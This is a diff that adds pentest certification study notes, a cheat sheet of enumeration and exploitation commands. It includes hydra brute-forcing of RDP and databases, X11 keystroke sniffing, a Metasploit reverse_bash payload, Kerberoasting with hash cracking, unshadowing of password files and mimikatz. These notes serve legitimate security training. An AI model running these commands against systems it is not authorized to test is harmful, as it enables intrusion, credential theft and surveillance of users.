@@ -1,0 +1,177 @@
+CRT mptes
+### Appendix A ###
+WireShark, reading PCAP etc.
+
+##### Fingerprinting #####
+ping -c 4 IP
+TTL 128 is Microsoft Windows
+TTL 64 is Linux but these values depend on hops.
+
+telnet IP PORT
+
+### Appendix B ###
+##### DNS #####
+host -l domain.TLD subdomain.domain.TLD - zone transfer
+dnsrecon -d domain.TLD - looks at SRV as well.
+dnsenum domain.TLD - zonetransfers, reads each record etc.
+host -v -t A domain.TLD - queries A records on the domain
+dig @subdomain.domain.TLD chaos version.bind txt # reveals DNS version
+
+### Appendix C ###
+
+##### Host Discovery ##### 
+
+arp-scan IPRange
+nmap -sn IPRange - host discovery
+nmap -sP IPRange - ping sweep
+netdiscover -r IPRange
+fping -a -g IPRange 2> /dev/null
+nmap -n -sn -PS IPRange - TCP sweep
+
+##### IP Routing ##### 
+ip route add subnet(that the target is on) via gateway(the box you can access that can access the subnet)
+ping IP - can confirm connectivity.
+
+##### UDP #####
+nmap -sU IP
+Ports to watch out for:
+- 69 - TFTP
+- 53 - DNS
+- 123 - NTP
+- 161 - SNMP
+
+
+##### Service Identification #####
+telnet IP Port - grabs banner
+wget IP -q -S - works for web servers, displays server header if present.
+curl -s -l IP | grep -e "Server:" - grabs server header
+nmap -sV -p PORT IP - software version via nmap
+nmap -sV --script=banner IP - another way to get banner
+nc -v  IP PORT - banner grabs with Netcat
+dmitry -bp IP - goes through all open services and identifies software names and versions
+
+
+### Appendix D ###
+
+##### unencrypted services #####
+telnet IP
+nmap -sU -p 69 --script=tftp-enum IP - enumerates tftp
+tftp IP - this is not interactive, you sort of have to guess files exist.
+When connected with tftp:
+get /filename
+
+
+##### Desktop Access #####
+hydra -L users.txt -P pass.txt IP rdp - brute forces RDP
+redesktop IP - connects and opens login screen
+vncviewer IP - same as above but for VNC
+
+##### FTP #####
+nmap -p 21 --script=ftp-anon IP - checks for anonymous login
+ftp anonymous@IP
+ftp IP - then let it request username and password (some FTP services insist on this)
+If ftp doesn't work, try it in the network 'Browse Network' dialogue in kali and add ftp://IP
+
+##### SNMP #####
+nmap -sU -p 161 IP
+onesixtyone IP - discovers community strings
+snmapwalk -c public -v1 IP 
+snmp-check -c public -v1 IP - these commands can return huge amounts of information, so maybe output to a file and grep through.
+
+##### SSH #####
+telnet IP 22 - gets banner
+nmap -p 22 --script=sshv1 IP
+
+##### NFS ######
+nmap -p 2049 IP
+showmount -e IP
+mount -t nfs IP:/share /mylocalshare
+
+##### X Window #####
+nmap -p 6000 -open IP
+nmap -p 6000 -script=x11-access IP
+xwininfo -root -tree -display IP:0
+search for gnome session in the output
+xwd -root -screen -silent -display IP:window > screenshot.xwd
+xspy IP - sniffs keystrokes on remote X server
+
+Exploiting this further:
+msfconsole
+use exploit/unix/x11/x11_keyboard_interact
+set RHOSTS targetIP
+set payload cmd/unix/reverse_bash
+set TIME_WAIT 10
+run
+
+##### finger #####
+nmap -p 79 --open IP
+finger user@IP - this can show you home directory of users, shells, usernames, mail etc.
+
+
+##### NTP #####
+nmap -sU -p 123 -sS -sV IP 
+nmap -sU -p 123 --script=ntp-info IP
+ntpq -c readlist IP - shows information about NTP server
+ntpq -c peers IP - shows information about NTP peers.
+ntpq -c associations IP - shows information about NTP associations
+
+##### SMTP #####
+telnet IP 25 - connects
+ehlo hostname - give you a list of commands
+VRFY root - verifies root user exists.
+msfconsole has smtp_enum scanner
+
+### Appendix E ### Windows
+nmap -p 135,139,445 -oG windows_hosts.txt IPRange
+enum4linux -a IP - gives loads of information but generally looking at users
+nbtscan -v -s : IP - shows roles like 1cG is domain controller.
+smbclient -N -L //IP - null session
+smbclient //IP/share
+while connected to SMB, use get or put to get or put files.
+impacket-GetUserSPNs -dc-ip IP -request domain/username:password - gets a hash if there's a service account and dumps a kerberos hash. 
+john --format=krb5tgs --wordlist=wordlist.txt kerberos.txt
+
+##### Desktop Breakout #####
+https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/ - read and memorise as best you can. Look at ways you can share files, using complete paths to files, various executables like ftp.exe, cmd.exe, powershell.exe etc. Use dialogue boxes and work with as many as you can. Check run, task manager to see if you can run tasks and start processes etc. 
+
+
+### Other Simple Exploitation ###
+
+##### unshadowing #####
+get etc/passwd and shadow 
+unshadow passwd shadow > passwords
+john passwords --wordlist=list.txt - cracks it
+
+##### smb vulns #####
+nmap -v -p 445 --script=smb-vuln* IP - vuln scans against smb
+msfconsole - search for the identified vulns
+
+If it's an AD box, load kiwi opens mimikatz in metasploit. 
+
+##### Databases #####
+# MSSQL #
+nmap -p 1433 --open IP
+nmap -p 1433 --script=ms-sql-info IP
+hydra -s PORT -l username(probably sa) -P password.txt -t 30 -w 15 IP mssql
+
+# Oracle #
+oscanner -P 1521 -s IP -v - enumerates Oracle database
+
+# MYSQL #
+nmap -p 3306 --script=mysql-empty-password IP
+mysql -h IP -u username -p
+
+sqlmap -r req.txt
+
+# PostgreSQL #
+nmap -p 5432 IP
+nmap -p 5432 -sV IP - shows version info
+msfconsole has a postgre_login module that checks default credentials.
+hydra -L users.txt -P pass.txt IP postgres
+psql -h IP -U postgres - connects to postgres
+
+
+##### Web Stuff #####
+really simple basic payloads, use active scanner on Burp
+Run Nikto or nmap --script=http-methods to identify dodgy methods.
+
